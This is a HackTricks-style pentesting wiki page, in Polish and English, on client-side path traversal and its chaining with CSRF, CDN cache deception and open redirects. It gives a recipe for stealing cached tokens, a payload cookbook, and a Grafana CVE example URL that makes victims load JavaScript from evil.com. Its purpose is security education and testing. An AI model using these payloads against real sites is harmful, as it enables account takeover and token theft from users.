# Client Side Path Traversal

{{#include ../banners/hacktricks-training.md}}

## Podstawowe informacje

A client side path traversal występuje, gdy możesz **modyfikować ścieżkę URL**, która ma zostać **wysłana użytkownikowi do odwiedzenia w sposób legalny** lub którą użytkownik zostanie w jakiś sposób **zmuszony odwiedzić, na przykład przez JS lub CSS**. CSPT is also known as **On-Site Request Forgery (OSRF)** ponieważ pozwala zmusić przeglądarkę ofiary do wywoływania dowolnych ścieżek na tej samej origin z jej cookies, JWTs, lub mTLS certificates.

Typowe źródła (dane, które kontrolujesz):

- Parametry trasy, które są konkatenowane do `fetch()` lub XHR paths (React Router, Next.js dynamic routes, Vue router params, Angular `ActivatedRoute`).
- Przechowywane wartości (profile slugs, document IDs), które są interpolowane do ścieżek wewnątrz zadań w tle, service workers lub WebSocket URLs.
- Elementy UI (przyciski download/export, galerie obrazów), które dodają fragmenty kontrolowane przez użytkownika lub rozszerzenia plików do endpointów API przed wysłaniem żądania.

Typowe miejsca docelowe (gdzie trafia traversal):

- Frontend API wrappers, które dopisują `/api/` lub `/proxy/` i automatycznie ponownie używają nagłówków autoryzacji.
- `history.pushState` / `router.navigate` helpers, które rekonstruują URL-e później podczas hydration.
- `<link>`/`<style>`/`@import` deklaracje generowane przez treści CMS lub payloady feature-flag.

### Typowe skutki & łańcuchy

- **CSPT ➜ CSRF/OSRF**: przechwycenie uwierzytelnionych wywołań `POST/PUT/DELETE` przez ucieczkę z zamierzonej ścieżki zasobu, a następnie ponowne wejście do wrażliwych endpointów (reset hasła, akceptacja płatności, cofnięcie dostępu). Połącz z checklistą [CSRF](csrf-cross-site-request-forgery.md), aby eskalować.
- **CSPT ➜ cache deception / poisoning**: serwuj JSON kontrolowany przez atakującego z publicznych kluczy CDN i odtwarzaj go bez uwierzytelnienia. Zobacz [Cache Poisoning and Cache Deception](cache-deception/README.md).
- **CSPT ➜ Open Redirect ➜ XSS/SSRF**: traversal trafia na endpoint open redirect, który następnie przekierowuje do infrastruktury atakującego serwującej złośliwe JS lub SSRF payloady. Połącz z nadużyciami [Open Redirect](open-redirect.md).

### Przykładowe odkrycia

- W [**tym writeupie**](https://erasec.be/blog/client-side-path-manipulation/) możliwe było **zmodyfikować adres zaproszenia (invite URL)** tak, że ostatecznie **anulowano kartę**.
- W [**tym writeupie**](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html) możliwe było połączenie **client side path traversal via CSS** (możliwość zmiany ścieżki, z której ładowano zasób CSS) z **open redirect**, aby załadować zasób CSS z **domeny kontrolowanej przez atakującego**.
- W [**tym writeupie**](https://blog.doyensec.com/2024/07/02/cspt2csrf.html) można zobaczyć technikę nadużycia CSPT **w celu wykonania ataku CSRF**. Dokonuje się tego przez **monitorowanie wszystkich danych**, którymi atakujący może sterować (ścieżka URL, parametry, fragment, dane wstrzyknięte do DB...) **oraz sinków**, do których te dane trafiają (wykonywane żądania).
- Sprawdź [**to rozszerzenie przeglądarki**](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/), aby to monitorować.
- Wypróbuj [**CSPT playground**](https://github.com/doyensec/CSPTPlayground), aby przetestować technikę.
- Zobacz [**ten tutorial**](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html) jak używać rozszerzenia w playgroundzie.

## CSPT-assisted web cache poisoning/deception

CSPT można łączyć z extension-based CDN caching, aby eksfiltrować wrażliwe JSON leaked by authenticated API calls:

- Frontend konkatenowuje dane kontrolowane przez użytkownika do ścieżki API i dołącza nagłówki uwierzytelniające w fetch/XHR.
- Poprzez wstrzyknięcie dot-segmentów (../) możesz przekierować uwierzytelnione żądanie do innego endpointu na tej samej origin.
- Jeśli ten endpoint (lub wariant ścieżki z wyglądającym na statyczny sufiksem, np. .css) jest cachowany przez CDN bez uwzględniania nagłówków auth, uwierzytelniona odpowiedź ofiary może zostać zapisana pod publicznym kluczem cache i pobrana przez dowolną osobę.

Szybki przepis:

1) Znajdź kod SPA budujący URL-e API z parametrów ścieżki, który wysyła auth headers.
2) Zidentyfikuj wrażliwe endpointy i przetestuj statyczne sufiksy (.css, .js, .jpg, .json), aby sprawdzić, czy CDN przełącza się na Cache-Control: public/max-age i X-Cache: Hit przy zwracaniu JSON.
3) Nakłon ofiarę do URL-a, który wstrzykuje traversal w parametr SPA, tak aby uwierzytelniony fetch trafił na wariant ścieżki nadający się do cache'owania (na przykład, ../../../v1/token.css).
4) Odczytaj ten sam URL anonimowo, aby uzyskać zcache'owane sekret (token → ATO).

Szczegóły i mitigacje w sekcji Cache Deception: [Cache Poisoning and Cache Deception](cache-deception/README.md).

## Proces wyszukiwania i narzędzia

### Odkrywanie pasywne za pomocą proxy przechwytujących

- **Automatyczne korelowanie źródeł/sinków**: rozszerzenie [CSPT Burp extension](https://github.com/doyensec/CSPTBurpExtension) parsuje historię proxy, grupuje parametry, które później są odzwierciedlane w ścieżkach innych żądań, i może ponownie wysyłać proof-of-concept URL-e z canary tokens, aby potwierdzić eksploatowalne traversale. Po załadowaniu JAR ustaw `Source Scope` na parametry klienta (np. `id`, `slug`) i `Sink Methods` na `GET, POST, DELETE`, aby rozszerzenie wyróżniało niebezpieczne konstruktory żądań. Możesz wyeksportować wszystkie podejrzane źródła z osadzonym canary, aby zweryfikować je hurtowo.
- **Szukaj podwójnego dekodowania URL**: podczas przeglądania z Burp lub ZAP obserwuj wzorce `/api/%252e%252e/`, które są normalizowane przez frontend zanim trafią do sieci — zwykle pojawiają się jako base64-encoded JSON bodies odnoszące się do stanu routingu i łatwo je przeoczyć bez automatycznego skanera.

### Ręczne instrumentowanie sinków SPA

Wklejenie krótkiego snippetu w DevTools pomaga ujawnić ukryte traversals podczas interakcji z UI:
```javascript
(() => {
const origFetch = window.fetch;
window.fetch = async function (input, init) {
if (typeof input === "string" && /\.\.\//.test(input)) {
console.log("[CSPT candidate]", input, init?.method || "GET");
debugger;
}
return origFetch.apply(this, arguments);
};
})();
```
- Dodaj podobne wrappery wokół `XMLHttpRequest.prototype.open`, `history.pushState`, oraz routerów specyficznych dla frameworków (np. `next/router`). Monitorowanie `init.credentials === "include"` szybko zawęża żądania niosące ciasteczka sesyjne.
- Jeśli aplikacja przechowuje wskazówki routingu w IndexedDB/localStorage, edytuj te wpisy za pomocą payloadów traversal i przeładuj — zmodyfikowany stan często jest ponownie wstrzykiwany do żądań przed hydratacją.

### Lab & payload rehearsal

- Uruchom CSPT Playground przez `docker compose up` i ćwicz łączenie traversal ➜ CSRF ➜ stored XSS bez kontaktu z celem. Odtworzenie lokalnie struktury routera celu ułatwia tworzenie dzielonych PoCs.
- Prowadź notatnik udanych wariantów dot-segmentów (`..;/`, `%2e%2e/`, `%2e./%2e/`, UTF-8 homoglyphs) oraz sztuczek z sufiksami (`.css`, `.json`, `;` matrix params) zaobserwowanych podczas recon, aby móc je szybko odtworzyć, gdy pojawi się nowy sink.

## Najnowsze studia przypadków (2025)

- **Grafana OSS CVE-2025-4123/6023 (v11.5.0+)** – A traversal gadget inside `/public/plugins/` let attackers smuggle `../../` into the plugin asset loader, chain it with Grafana’s open redirect, and force victims to load attacker-controlled plugin bundles. When anonymous dashboards were enabled, a crafted URL such as `https://grafana.example.com/public/plugins/../../../../..//evil.com/poc/module.js` resulted in the browser executing remote JavaScript; if the Image Renderer plugin was installed, the same primitive could be flipped into SSRF by redirecting rendering requests toward internal hosts. Always test plugin asset paths, anonymous dashboards, and renderer endpoints together because a single traversal often gives you both XSS and SSRF angles.

## Payload cookbook

| Goal | Payload pattern | Notes |
| --- | --- | --- |
| Trafienie sąsiedniego API pod tym samym originem | `?doc=../../v1/admin/users` | Działa, gdy routery po prostu doklejają `/${doc}`. Dodaj `.json` jeśli CDN tylko cache'uje zasoby wyglądające na statyczne. |
| Zmuszenie SPA do podążenia za open redirect | `?next=..%2f..%2f..%2flogin/callback/%3FreturnUrl=https://attacker.tld/x` | Połącz z zaufanymi redirectorami wymienionymi w kodzie celu. Chain with [Open Redirect](open-redirect.md). |
| Nadużycie cache'u CDN opartego na rozszerzeniach | `?file=../../v1/token.css` | CDN może traktować `.css` jako statyczny i cachować sekrety zwrócone jako JSON. |
| CSRF przez zmianę werbu | `?action=../../payments/approve/.json&_method=POST` | Niektóre routery akceptują nadpisania `_method`; połącz z traversal, aby przeforsować żądania do destrukcyjnych endpointów. |

## References

- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Grafana CVE-2025-4123 Chained Path Traversal + Open Redirect Analysis](https://www.cve.news/cve-2025-4123/)
- [Doyensec CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)

{{#include ../banners/hacktricks-training.md}}
